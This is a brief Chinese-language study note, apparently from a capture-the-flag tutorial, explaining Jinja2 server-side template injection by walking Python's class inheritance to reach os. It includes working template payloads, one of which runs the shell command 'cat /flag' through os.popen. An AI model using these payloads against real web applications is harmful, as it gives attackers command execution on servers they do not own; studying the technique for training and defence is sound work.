**3.**类与对象，找到能执行命令的类（SSTI)

模板（jinja2)不能直接写os、system()，但是能访问python的内置对象和类

''.__class__ （字符串的类)
[].__class__ （列表的类）
{}.__class__ （字典的类）

__class__ →属于哪个类 __base__→找该类的父类 __subclasses__() →找所有继承的子类 __globals__→工具箱

打印所有子类 {{ ''.__class__.__base__.__subclasses__() }} ，找类在列表里的下标

{{ ''.__class__.__base__.__subclasses__()[132].__globals__['os'].popen('cat /flag').read() }}

随手找字符串启动→找到它的类→找到父类→找到所有子类→ 挑一个能执行命令的类→执行命令

SSTI即靠类的继承关系，找到执行命令的入口
